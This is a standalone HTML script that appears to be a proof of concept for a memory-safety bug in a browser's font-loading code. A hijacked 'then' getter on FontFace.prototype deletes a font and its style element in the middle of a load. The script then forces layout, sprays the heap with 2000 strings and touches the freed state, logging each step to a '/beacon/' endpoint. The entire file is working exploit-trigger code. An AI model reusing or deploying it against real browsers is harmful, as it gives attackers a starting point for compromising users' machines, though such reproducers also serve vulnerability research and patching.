<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
(function(){
  function run() {
    b('SZ-START');

    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    var st = document.createElement('style');
    st.id = 'victim-style';
    st.textContent = "@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
    document.head.appendChild(st);
    b('SZ-SETUP');

    var fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function(){
        if (fired) return undefined;
        fired = true;
        b('SZ-GETTER-ENTER');
        var v = document.getElementById('victim-style');
        if (v) { v.remove(); b('SZ-STYLE-REMOVED'); }
        try { document.fonts.delete(this); b('SZ-DELETED-' + document.fonts.size); }
        catch (e) { b('SZ-DEL-ERR'); }
        document.body.offsetHeight;
        b('SZ-LAYOUT-DONE');
        var spray = [];
        for (var i = 0; i < 2000; i++) {
          var arr = new Array(128).fill("A");
          spray.push(arr.join(""));
        }
        b('SZ-SPRAYED-8bit-128');
        var v2 = 'unknown';
        try { v2 = document.fonts.check('1em x'); } catch (e) { v2 = 'throw'; }
        b('SZ-CHECK-' + v2);
        b('SZ-GETTER-RETURN');
        return undefined;
      },
      set: function(){}
    });

    b('SZ-CALL-LOAD');
    document.fonts.load('1em a, x', 'AB').then(
      function(){ b('SZ-RESOLVED'); },
      function(){ b('SZ-REJECTED'); }
    );

    setTimeout(function(){
      b('SZ-FORCE-PRE');
      var div = document.createElement('div');
      div.style.fontFamily = 'x';
      div.textContent = 'TEST';
      document.body.appendChild(div);
      var h = div.offsetHeight;
      b('SZ-FORCE-POST-h' + h);
    }, 100);
  }
  if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
  else document.addEventListener('DOMContentLoaded', run);
})();
</script>
